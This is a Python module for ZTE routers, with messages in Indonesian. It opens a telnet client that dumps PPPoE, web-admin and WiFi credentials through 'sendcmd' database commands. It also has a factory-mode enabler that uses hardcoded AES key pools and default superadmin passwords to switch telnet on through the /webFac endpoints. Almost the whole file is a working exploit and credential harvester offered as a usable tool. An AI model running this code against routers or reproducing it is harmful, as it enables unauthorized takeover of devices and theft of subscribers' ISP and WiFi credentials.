"""
ZTE Router Telnet Management & Credential Extractor Module

Provides:
1. ZTETelnetClient: Socket-based telnet client with IAC protocol handling.
2. Credential Extraction: Automatically executes ZTE sendcmd commands to extract:
   - PPPoE credentials (plain text)
   - Web admin and superadmin logins
   - WiFi SSID and passphrases
3. Factory Mode Enabler: Activates Telnet via ZTE /webFac and /webFacEntry endpoints.
4. Port Reachability Testing: Fast TCP probe for Telnet port 23.
"""

import array
import binascii
import logging
import random
import re
import socket
import time
import urllib.parse
import urllib.request
from typing import Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)

# Telnet Protocol Constants
IAC = b"\xff"
DONT = b"\xfe"
DO = b"\xfd"
WONT = b"\xfc"
WILL = b"\xfb"
SB = b"\xfa"
SE = b"\xf0"


class ZTETelnetError(Exception):
    """Base exception for ZTE Telnet operations"""
    pass


class ZTETelnetClient:
    """
    Socket-based Telnet Client designed specifically for ZTE router shells.
    Negotiates Telnet options automatically and executes ZTE shell / sendcmd commands.
    """

    def __init__(self, host: str, port: int = 23, timeout: float = 8.0):
        self.host = host.replace("http://", "").replace("https://", "").strip("/").split(":")[0]
        self.port = port
        self.timeout = timeout
        self.sock: Optional[socket.socket] = None

    def connect(self) -> None:
        """Open TCP socket to Telnet daemon"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(self.timeout)
            self.sock.connect((self.host, self.port))
        except (socket.timeout, TimeoutError):
            raise ZTETelnetError(f"Koneksi telnet ke {self.host}:{self.port} timed out (timeout={self.timeout}s). Pastikan port telnet terbuka dan dapat diakses dari jaringan ini.")
        except ConnectionRefusedError:
            raise ZTETelnetError(f"Koneksi telnet ke {self.host}:{self.port} ditolak (Connection refused). Layanan Telnet belum aktif pada port ini.")
        except Exception as e:
            raise ZTETelnetError(f"Gagal menghubungkan ke {self.host}:{self.port}: {e}")

    def close(self) -> None:
        """Close socket connection"""
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
            self.sock = None

    def _read_byte(self) -> bytes:
        """Read a single byte from socket"""
        b = self.sock.recv(1)
        if not b:
            raise ZTETelnetError("Koneksi ditutup oleh router secara tiba-tiba.")
        return b

    def _read_chunk_negotiate(self) -> bytes:
        """
        Read data while handling Telnet IAC commands automatically.
        Rejects all option requests with WONT / DONT to keep connection raw.
        """
        out = bytearray()
        while True:
            try:
                b = self._read_byte()
            except socket.timeout:
                break

            if b == IAC:
                cmd = self._read_byte()
                if cmd in (DO, DONT):
                    opt = self._read_byte()
                    # Respond WONT to all DO/DONT requests
                    self.sock.sendall(IAC + WONT + opt)
                elif cmd in (WILL, WONT):
                    opt = self._read_byte()
                    # Respond DONT to all WILL/WONT requests
                    self.sock.sendall(IAC + DONT + opt)
                elif cmd == SB:
                    # Subnegotiation: skip until SE
                    while True:
                        sub_b = self._read_byte()
                        if sub_b == IAC:
                            if self._read_byte() == SE:
                                break
                elif cmd == IAC:
                    out.append(255)
            else:
                out.append(b[0])
                # If there's more in buffer, keep reading without waiting
                try:
                    self.sock.settimeout(0.05)
                    while True:
                        extra = self.sock.recv(1024)
                        if not extra:
                            break
                        # Filter IAC in extra buffer if any
                        i = 0
                        while i < len(extra):
                            if extra[i : i + 1] == IAC:
                                i += 3  # skip IAC + CMD + OPT
                            else:
                                out.append(extra[i])
                                i += 1
                except socket.timeout:
                    pass
                finally:
                    self.sock.settimeout(self.timeout)
                break

        return bytes(out)

    def read_until(self, patterns: List[bytes], timeout: Optional[float] = None) -> Tuple[int, bytes]:
        """
        Read until one of the byte patterns matches or timeout occurs.
        Returns (index_of_pattern, accumulated_bytes).
        """
        deadline = time.time() + (timeout if timeout is not None else self.timeout)
        buf = bytearray()

        while time.time() < deadline:
            remaining = max(0.2, deadline - time.time())
            self.sock.settimeout(remaining)
            try:
                chunk = self._read_chunk_negotiate()
                if chunk:
                    buf.extend(chunk)
                    for idx, pat in enumerate(patterns):
                        if pat in buf:
                            return idx, bytes(buf)
            except socket.timeout:
                pass

        # Timeout reached
        for idx, pat in enumerate(patterns):
            if pat in buf:
                return idx, bytes(buf)
        raise ZTETelnetError(f"Timeout menunggu respon telnet (diterima: {bytes(buf).decode('latin1', 'replace')[-200:]})")

    def login(self, username: str, password: str) -> str:
        """
        Log into the ZTE Telnet session.
        Handles various prompt formats (Username:, Login:, Password:, #, $, >).
        """
        # Read initial banner or prompt
        idx, initial = self.read_until([b"Username:", b"username:", b"login:", b"Login:", b"#", b"$", b">"], timeout=6.0)

        # Already at shell?
        if idx >= 4:
            return initial.decode("latin1", "replace")

        # Send username
        self.sock.sendall(username.encode("ascii") + b"\r\n")

        # Wait for password prompt
        idx2, pass_prompt = self.read_until([b"Password:", b"password:", b"#", b"$", b">"], timeout=6.0)
        if idx2 >= 2:
            return pass_prompt.decode("latin1", "replace")

        # Send password
        self.sock.sendall(password.encode("ascii") + b"\r\n")

        # Wait for shell prompt
        try:
            _, shell_banner = self.read_until([b"#", b"$", b">", b"Login incorrect", b"invalid"], timeout=6.0)
            text = shell_banner.decode("latin1", "replace")
            if "incorrect" in text.lower() or "invalid" in text.lower():
                raise ZTETelnetError("Kredensial telnet ditolak (Login incorrect / invalid user or password).")
            return text
        except ZTETelnetError as e:
            if "incorrect" in str(e).lower() or "invalid" in str(e).lower():
                raise
            # If shell prompt not explicitly matched, try sending Enter to see if prompt appears
            self.sock.sendall(b"\r\n")
            _, res = self.read_until([b"#", b"$", b">"], timeout=3.0)
            return res.decode("latin1", "replace")

    def run_command(self, cmd: str, timeout: float = 8.0) -> str:
        """
        Run a command in the Telnet shell and capture its text output.
        """
        if not self.sock:
            raise ZTETelnetError("Telnet belum terhubung.")

        clean_cmd = cmd.strip()
        self.sock.sendall(clean_cmd.encode("ascii") + b"\r\n")

        # Give router brief pause to execute
        time.sleep(0.3)

        # Read until prompt appears again or timeout
        accum = bytearray()
        deadline = time.time() + timeout

        while time.time() < deadline:
            remaining = max(0.2, deadline - time.time())
            self.sock.settimeout(remaining)
            try:
                chunk = self._read_chunk_negotiate()
                if chunk:
                    accum.extend(chunk)
                    # Check for prompt at end of lines
                    tail = bytes(accum)[-50:].strip()
                    if tail.endswith(b"#") or tail.endswith(b"$") or tail.endswith(b">"):
                        break
            except socket.timeout:
                break

        res = bytes(accum).decode("latin1", "replace")
        # Strip echo of the command itself if present
        if clean_cmd in res:
            res = res.split(clean_cmd, 1)[-1]
        # Clean trailing prompt
        lines = res.splitlines()
        if lines and lines[-1].strip() in ("#", "$", ">", "/ #", "/ $"):
            lines.pop()
        return "\n".join(lines).strip()

    def extract_credentials(self) -> Dict:
        """
        Run ZTE sendcmd commands to extract:
        - WAN PPPoE username & plaintext password
        - Web administration passwords (DevAuthInfo)
        - WiFi ESSID & passphrases
        """
        commands = [
            "sendcmd 1 DB p WANCP",
            "sendcmd 1 DB p WANC",
            "sendcmd 1 DB p DevAuthInfo",
            "sendcmd 1 DB p UserAccount",
            "sendcmd 1 DB p KeyPassphrase",
            "sendcmd 1 DB p WLANCfg",
        ]

        raw_outputs = {}
        for cmd in commands:
            try:
                output = self.run_command(cmd, timeout=5.0)
                raw_outputs[cmd] = output
                time.sleep(0.15)
            except Exception as e:
                raw_outputs[cmd] = f"Error: {e}"

        # Parse extracted info
        combined_text = "\n".join(raw_outputs.values())

        creds = {
            "pppoe": [],
            "admin": [],
            "wifi": [],
            "raw_outputs": raw_outputs,
        }

        # 1. PPPoE extraction from sendcmd output
        # Format 1: <DM name="Username" value="user@telkom.net"/><DM name="Password" value="secret"/>
        matches_dm = re.finditer(
            r'name=[\'"](?:Username|UserName)[\'"]\s+value=[\'"]([^\'"]+)[\'"].*?name=[\'"]Password[\'"]\s+value=[\'"]([^\'"]*)[\'"]',
            combined_text,
            re.DOTALL | re.IGNORECASE,
        )
        for m in matches_dm:
            u, p = m.group(1).strip(), m.group(2).strip()
            if u and not any(x["username"] == u for x in creds["pppoe"]):
                creds["pppoe"].append({"username": u, "password": p})

        # Format 2: <Field name="Username" value="..."/> ... <Field name="Password" value="..."/>
        matches_f = re.finditer(
            r'name=[\'"](?:Username|UserName)[\'"]\s+value=[\'"]([^\'"]+)[\'"].*?name=[\'"]Password[\'"]\s+value=[\'"]([^\'"]*)[\'"]',
            combined_text,
            re.DOTALL | re.IGNORECASE,
        )
        for m in matches_f:
            u, p = m.group(1).strip(), m.group(2).strip()
            if u and not any(x["username"] == u for x in creds["pppoe"]):
                creds["pppoe"].append({"username": u, "password": p})

        # Format 3: Line-based text output: "Username = ..." / "Password = ..."
        u_lines = re.findall(r'(?:Username|UserName)\s*[:=]\s*([^\r\n]+)', combined_text, re.IGNORECASE)
        p_lines = re.findall(r'Password\s*[:=]\s*([^\r\n]+)', combined_text, re.IGNORECASE)
        for u, p in zip(u_lines, p_lines):
            u, p = u.strip().strip('"').strip("'"), p.strip().strip('"').strip("'")
            if ("@" in u or "telkom" in u or "net" in u) and not any(x["username"] == u for x in creds["pppoe"]):
                creds["pppoe"].append({"username": u, "password": p})

        # 2. Web Admin / Superadmin logins (DevAuthInfo / UserAccount)
        auth_matches = re.finditer(
            r'name=[\'"]User[\'"]\s+value=[\'"]([^\'"]+)[\'"].*?name=[\'"]Pass[\'"]\s+value=[\'"]([^\'"]*)[\'"]',
            combined_text,
            re.DOTALL | re.IGNORECASE,
        )
        for m in auth_matches:
            u, p = m.group(1).strip(), m.group(2).strip()
            if u and not any(x["username"] == u for x in creds["admin"]):
                creds["admin"].append({"username": u, "password": p})

        # 3. WiFi Passwords & SSIDs
        wifi_pass = re.findall(
            r'name=[\'"]KeyPassphrase[\'"]\s+value=[\'"]([^\'"]+)[\'"]',
            combined_text,
            re.IGNORECASE,
        )
        wifi_ssid = re.findall(
            r'name=[\'"]ESSID[\'"]\s+value=[\'"]([^\'"]+)[\'"]',
            combined_text,
            re.IGNORECASE,
        )
        for i, pwd in enumerate(wifi_pass):
            ssid = wifi_ssid[i] if i < len(wifi_ssid) else f"SSID_{i + 1}"
            if not any(x["password"] == pwd for x in creds["wifi"]):
                creds["wifi"].append({"ssid": ssid, "password": pwd})

        return creds


# -------------------------------------------------------------------------
# Factory Mode Telnet Enabler (/webFac)
# -------------------------------------------------------------------------

class AESModeECB:
    """Minimal ECB mode cipher using Cryptodome or pycryptodome"""
    def __init__(self, key: bytes):
        try:
            from Cryptodome.Cipher import AES
            self.cipher = AES.new(key, AES.MODE_ECB)
        except ImportError:
            from Crypto.Cipher import AES
            self.cipher = AES.new(key, AES.MODE_ECB)

    def encrypt(self, data: bytes) -> bytes:
        return self.cipher.encrypt(data)

    def decrypt(self, data: bytes) -> bytes:
        return self.cipher.decrypt(data)


def _pad_16(data: bytes) -> bytes:
    padding_len = 16 - (len(data) % 16)
    return data + b"\x00" * padding_len


def _unpad_16(data: bytes) -> bytes:
    return data.rstrip(b"\x00")


AES_KEY_POOL_V1 = [
    0x7B, 0x56, 0xB0, 0xF7, 0xDA, 0x0E, 0x68, 0x52, 0xC8, 0x19,
    0xF3, 0x2B, 0x84, 0x90, 0x79, 0xE5, 0x62, 0xF8, 0xEA, 0xD2,
    0x64, 0x93, 0x87, 0xDF, 0x73, 0xD7, 0xFB, 0xCC, 0xAA, 0xFE,
    0x75, 0x43, 0x1C, 0x29, 0xDF, 0x4C, 0x52, 0x2C, 0x6E, 0x7B,
    0x45, 0x3D, 0x1F, 0xF1, 0xDE, 0xBC, 0x27, 0x85, 0x8A, 0x45,
    0x91, 0xBE, 0x38, 0x13, 0xDE, 0x67, 0x32, 0x08, 0x54, 0x11,
    0x75, 0xF4, 0xD3, 0xB4, 0xA4, 0xB3, 0x12, 0x86, 0x67, 0x23,
    0x99, 0x4C, 0x61, 0x7F, 0xB1, 0xD2, 0x30, 0xDF, 0x47, 0xF1,
    0x76, 0x93, 0xA3, 0x8C, 0x95, 0xD3, 0x59, 0xBF, 0x87, 0x8E,
    0xF3, 0xB3, 0xE4, 0x76, 0x49, 0x88,
]

AES_KEY_POOL_V2 = [
    0x8C, 0x23, 0x65, 0xD1, 0xFC, 0x32, 0x45, 0x37, 0x11, 0x28,
    0x71, 0x63, 0x07, 0x20, 0x69, 0x14, 0x73, 0xE7, 0xD4, 0x53,
    0x13, 0x24, 0x36, 0xC2, 0xB5, 0xE1, 0xFC, 0xCF, 0x8A, 0x9A,
    0x41, 0x89, 0x3C, 0x49, 0xCF, 0x5C, 0x72, 0x8C, 0x9E, 0xEB,
    0x75, 0x0D, 0x3F, 0xD1, 0xFE, 0xCC, 0x57, 0x65, 0x7A, 0x35,
    0x21, 0x3E, 0x68, 0x53, 0x7E, 0x97, 0x02, 0x48, 0x74, 0x71,
    0x95, 0x34, 0x53, 0x84, 0xB4, 0xC3, 0xE2, 0xD6, 0x27, 0x3D,
    0xE6, 0x5D, 0x72, 0x9C, 0xBC, 0x3D, 0x03, 0xFD, 0x76, 0xC1,
    0x9C, 0x25, 0xA8, 0x92, 0x47, 0xE4, 0x18, 0x0F, 0x24, 0x3F,
    0x4F, 0x67, 0xEC, 0x97, 0xF4, 0x99,
]


def enable_telnet_factory_mode(
    host: str,
    port: int = 80,
    username: str = "superadmin",
    password: str = "suportadmin",
    mode: int = 2,
    timeout: float = 6.0,
) -> Dict:
    """
    Attempt to activate Telnet on a ZTE router using the webFac Factory Mode interface.
    Returns:
        {
            "success": bool,
            "telnet_user": str or None,
            "telnet_pass": str or None,
            "message": str
        }
    """
    clean_host = host.replace("http://", "").replace("https://", "").strip("/").split(":")[0]
    base_url = f"http://{clean_host}:{port}"
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor())

    def post(path: str, data: bytes) -> bytes:
        req = urllib.request.Request(f"{base_url}{path}", data=data, method="POST")
        with opener.open(req, timeout=timeout) as resp:
            return resp.read()

    try:
        # Step 0: Reset
        try:
            post("/webFac", b"SendSq.gch")
        except Exception:
            pass

        # Step 1: RequestFactoryMode
        try:
            post("/webFac", b"RequestFactoryMode.gch")
        except Exception:
            pass

        # Step 2: SendSq
        rand = random.randint(0, 59)
        sq_res = post("/webFac", f"SendSq.gch?rand={rand}\r\n".encode("ascii"))

        if len(sq_res) == 0:
            version = 1
            index = rand
            key_pool = AES_KEY_POOL_V1
        elif b"newrand" in sq_res:
            version = 2
            newrand = int(sq_res[len(b"newrand=") :])
            index = ((0x1000193 * rand) & 0x3F ^ newrand) % 60
            key_pool = AES_KEY_POOL_V2
        else:
            return {"success": False, "telnet_user": None, "telnet_pass": None, "message": f"Respon SendSq tidak dikenal: {sq_res[:50]!r}"}

        # Derive 24-byte AES key
        key_bytes = bytes((x ^ 0xA5) & 0xFF for x in key_pool[index : index + 24])
        cipher = AESModeECB(key_bytes)

        # Step 3: SendInfo (if version 2)
        if version > 1:
            info_data = cipher.encrypt(_pad_16(b"SendInfo.gch?info=6|"))
            post("/webFacEntry", info_data)

        # Step 4: CheckLoginAuth
        auth_payload = f"CheckLoginAuth.gch?version50&user={username}&pass={password}".encode("ascii")
        auth_enc = cipher.encrypt(_pad_16(auth_payload))
        auth_res = post("/webFacEntry", auth_enc)

        if len(auth_res) % 16 != 0:
            auth_res = _pad_16(auth_res)
        dec_auth = _unpad_16(cipher.decrypt(auth_res))
        logger.info(f"CheckLoginAuth response: {dec_auth}")

        # Step 5: FactoryMode to open Telnet
        fac_payload = f"FactoryMode.gch?mode={mode}&user=notused".encode("ascii")
        fac_enc = cipher.encrypt(_pad_16(fac_payload))
        fac_res = post("/webFacEntry", fac_enc)

        if len(fac_res) % 16 != 0:
            fac_res = _pad_16(fac_res)
        dec_fac = _unpad_16(cipher.decrypt(fac_res)).decode("latin1", "replace")

        # Parse user and password from response:
        # e.g. FactoryModeAuth.gch?user=0TZUw5KO&pass=L8OhJl3z
        parsed = urllib.parse.urlparse(dec_fac)
        qdict = urllib.parse.parse_qs(parsed.query)

        telnet_user = qdict.get("user", [None])[0]
        telnet_pass = qdict.get("pass", [None])[0]

        if telnet_user and telnet_pass:
            return {
                "success": True,
                "telnet_user": telnet_user,
                "telnet_pass": telnet_pass,
                "message": f"Telnet berhasil diaktifkan via Factory Mode! User: {telnet_user}, Pass: {telnet_pass}",
            }
        else:
            return {
                "success": True,
                "telnet_user": None,
                "telnet_pass": None,
                "message": f"Perintah Factory Mode dikirim ({dec_fac}). Kredensial default (root/Zte521 atau admin/admin) mungkin aktif.",
            }

    except Exception as e:
        return {
            "success": False,
            "telnet_user": None,
            "telnet_pass": None,
            "message": f"Gagal mengaktifkan Factory Mode: {e}",
        }


def test_telnet_port(host: str, port: int = 23, timeout: float = 2.5) -> Dict:
    """
    Test whether Telnet port (23) is open and measure latency.
    """
    clean_host = host.replace("http://", "").replace("https://", "").strip("/").split(":")[0]
    start = time.time()
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((clean_host, port))
        sock.close()
        latency = round((time.time() - start) * 1000, 2)
        return {
            "open": True,
            "port": port,
            "latency_ms": latency,
            "message": f"Port Telnet {port} TERBUKA ({latency} ms)",
        }
    except (socket.timeout, TimeoutError):
        return {
            "open": False,
            "port": port,
            "latency_ms": None,
            "message": f"Port Telnet {port} TIMED OUT (filter firewall atau router tidak merespon)",
        }
    except ConnectionRefusedError:
        return {
            "open": False,
            "port": port,
            "latency_ms": None,
            "message": f"Port Telnet {port} TERTUTUP (Connection refused - layanan telnetd belum aktif)",
        }
    except Exception as e:
        return {
            "open": False,
            "port": port,
            "latency_ms": None,
            "message": f"Gagal memeriksa port {port}: {e}",
        }
